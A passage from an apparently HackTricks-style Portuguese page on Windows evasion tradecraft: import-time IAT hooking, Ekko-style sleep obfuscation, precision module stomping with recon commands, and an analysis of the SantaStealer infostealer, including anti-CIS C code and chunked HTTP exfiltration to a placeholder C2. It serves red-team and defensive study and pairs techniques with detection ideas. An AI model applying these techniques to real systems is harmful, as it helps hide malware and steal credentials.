- Integridade da IAT: entradas que resolvem para endereços non-image (heap/anon); verificação periódica de ponteiros de import.
- Anomalias de stack: return addresses que não pertencem a loaded images; transições abruptas para PIC non-image; ancestry inconsistente de `RtlUserThreadStart`.
- Telemetry de loader: writes in-process na IAT, atividade precoce de `DllMain` que modifica import thunks, regiões RX inesperadas criadas no load.
- Evasão de image-load: se estiver hookando `LoadLibrary*`, monitore loads suspeitos de automation/clr assemblies correlacionados com eventos de memory masking.

Related building blocks and examples
- Reflective loaders que fazem IAT patching durante o load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) e PIC de stack-cutting (stackcutting)
- PIC call-stack spoofing stubs (e.g., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Se você controla um reflective loader, você pode hook imports **durante** `ProcessImports()` substituindo o ponteiro `GetProcAddress` do loader por um resolver customizado que verifica hooks primeiro:

- Construa um **resident PICO** (persistent PIC object) que sobreviva depois que o transient loader PIC se liberar.
- Exporte uma função `setup_hooks()` que sobrescreva o import resolver do loader (e.g., `funcs.GetProcAddress = _GetProcAddress`).
- Em `_GetProcAddress`, ignore imports por ordinal e use uma busca de hook baseada em hash como `__resolve_hook(ror13hash(name))`. Se existir um hook, retorne-o; caso contrário, delegue para o `GetProcAddress` real.
- Registre targets de hook em link time com entradas Crystal Palace `addhook "MODULE$Func" "hook"`. O hook permanece válido porque vive dentro do resident PICO.

Isso produz **import-time IAT redirection** sem patching da code section do DLL carregado após o load.

### Forcing hookable imports when the target uses PEB-walking

Import-time hooks só disparam se a função realmente estiver na IAT do alvo. Se um módulo resolve APIs via PEB-walk + hash (sem entrada de import), force um import real para que o caminho `ProcessImports()` do loader o veja:

- Substitua a resolução de export por hash (e.g., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) por uma referência direta como `&WaitForSingleObject`.
- O compilador emite uma entrada IAT, habilitando interception quando o reflective loader resolve imports.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Em vez de patchar `Sleep`, hook as **primitives reais de wait/IPC** que o implant usa (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Para waits longos, envolva a chamada em uma cadeia de obfuscation estilo Ekko que criptografa a imagem em memória durante o idle:

- Use `CreateTimerQueueTimer` para agendar uma sequência de callbacks que chamam `NtContinue` com frames `CONTEXT` forjados.
- Cadeia típica (x64): definir a imagem para `PAGE_READWRITE` → criptografar com RC4 via `advapi32!SystemFunction032` sobre a imagem mapeada completa → executar o wait bloqueante → descriptografar com RC4 → **restaurar permissões por seção** percorrendo PE sections → sinalizar conclusão.
- `RtlCaptureContext` fornece um `CONTEXT` template; clone-o em múltiplos frames e ajuste registradores (`Rip/Rcx/Rdx/R8/R9`) para invocar cada passo.

Detalhe operacional: retorne “success” para waits longos (e.g., `WAIT_OBJECT_0`) para que o caller continue enquanto a imagem está masked. Esse padrão esconde o módulo de scanners durante janelas de idle e evita a assinatura clássica de “patched `Sleep()`”.

Ideias de detecção (baseadas em telemetry)
- Rajadas de callbacks de `CreateTimerQueueTimer` apontando para `NtContinue`.
- `advapi32!SystemFunction032` usado em buffers grandes, contíguos e do tamanho de uma image.
- `VirtualProtect` em grande range seguido por restauração customizada de permissões por seção.


## Precision Module Stomping

Module stomping executa payloads a partir da **seção `.text` de um DLL já mapeado dentro do processo alvo** em vez de alocar memória executável privada óbvia ou carregar um novo DLL sacrificial. O alvo da sobrescrita deve ser uma **image loaded, backed by disk** cujo espaço de código consiga absorver o payload sem corromper code paths que o processo ainda precisa.

### Reliable target selection

Stomping ingênuo contra módulos comuns como `uxtheme.dll` ou `comctl32.dll` é frágil: o DLL pode não estar carregado no processo remoto, e uma code region pequena demais vai derrubar o processo. Um workflow mais confiável é:

1. Enumerar os módulos do processo alvo e manter uma **include list apenas com nomes** dos DLLs já carregados.
2. Construir o payload primeiro e registrar seu **tamanho exato em bytes**.
3. Escanear DLLs candidatos em disco e comparar o PE section **`.text` `Misc_VirtualSize`** com o tamanho do payload. Isso importa mais do que o tamanho do arquivo porque reflete o tamanho da seção executável **quando mapeada em memória**.
4. Parsear a **Export Address Table (EAT)** e escolher um RVA de função exportada como offset inicial do stomp.
5. Calcular o **blast radius**: se o payload exceder o boundary da função selecionada, ele sobrescreverá exports adjacentes dispostos depois dela na memória.

Typical recon/selection helpers seen in the wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Notas operacionais
- Prefira DLLs **já carregadas** no processo remoto para evitar a telemetria de `LoadLibrary`/carregamentos de imagem inesperados.
- Prefira exports que raramente são executados pela aplicação alvo; caso contrário, caminhos normais de código podem atingir os bytes stomped antes ou depois da criação da thread.
- Implantes grandes frequentemente exigem alterar o embedding do shellcode de uma string literal para um **byte-array/braced initializer** para que o buffer completo seja representado corretamente na source do injector.

Ideias de detecção
- Writes remotas em **páginas executáveis backed por image** (`MEM_IMAGE`, `PAGE_EXECUTE*`) em vez das alocações privadas RWX/RX mais comuns.
- Pontos de entrada de exports cujos bytes na memória já não correspondem ao arquivo backing no disco.
- Remote threads ou pivots de contexto que iniciam execução dentro de um export legítimo de DLL cujos primeiros bytes foram modificados recentemente.
- Sequências suspeitas de `VirtualProtect(Ex)` / `WriteProcessMemory` contra páginas `.text` de DLL seguidas de criação de thread.

## SantaStealer Tradecraft para Fileless Evasion e Credential Theft

SantaStealer (aka BluelineStealer) ilustra como info-stealers modernos misturam AV bypass, anti-analysis e acesso a credenciais em um único workflow.

### Gating por layout de teclado e atraso de sandbox

- Um flag de config (`anti_cis`) enumera os keyboard layouts instalados via `GetKeyboardLayoutList`. Se um layout cirílico for encontrado, a sample solta um marcador vazio `CIS` e termina antes de executar stealers, garantindo que nunca detone em locales excluídos enquanto deixa um artifact para hunting.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### lógica em camadas de `check_antivm`

- A variante A percorre a lista de processos, faz hash de cada nome com um checksum rolante personalizado e compara com blocklists embutidas para debuggers/sandboxes; ela repete o checksum no nome do computador e verifica diretórios de trabalho como `C:\analysis`.
- A variante B inspeciona propriedades do sistema (limite mínimo de contagem de processos, uptime recente), chama `OpenServiceA("VBoxGuest")` para detectar adições do VirtualBox e executa checks de timing em torno de sleeps para identificar single-stepping. Qualquer detecção aborta antes do lançamento dos módulos.

### helper fileless + reflective loading duplo com ChaCha20

- A DLL/EXE principal embute um helper de credenciais do Chromium que é либо gravado em disco ou mapeado manualmente em memória; o modo fileless resolve imports/relocations por conta própria para que nenhum artefato do helper seja escrito.
- Esse helper armazena uma DLL de segunda etapa criptografada duas vezes com ChaCha20 (duas chaves de 32 bytes + nonces de 12 bytes). Após as duas passagens, ele carrega o blob de forma reflective (sem `LoadLibrary`) e chama os exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derivados de [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- As rotinas do ChromElevator usam reflective process hollowing via direct-syscall para injetar em um browser Chromium ativo, herdar chaves do AppBound Encryption e descriptografar passwords/cookies/credit cards diretamente de bancos de dados SQLite apesar do hardening do ABE.


### coleção modular em memória e exfiltração HTTP em chunks

- `create_memory_based_log` itera uma tabela global de ponteiros de função `memory_generators` e cria uma thread por módulo habilitado (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Cada thread grava os resultados em buffers compartilhados e informa sua contagem de arquivos após uma janela de join de ~45s.
- Quando termina, tudo é compactado com a library `miniz` linkada estaticamente como `%TEMP%\\Log.zip`. `ThreadPayload1` então dorme 15s e envia o archive em chunks de 10 MB via HTTP POST para `http://<C2>:6767/upload`, falsificando um boundary de `multipart/form-data` de browser (`----WebKitFormBoundary***`). Cada chunk adiciona `User-Agent: upload`, `auth: <build_id>`, opcionalmente `w: <campaign_tag>`, e o último chunk adiciona `complete: true` para que o C2 saiba que a remontagem foi concluída.

## References


- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
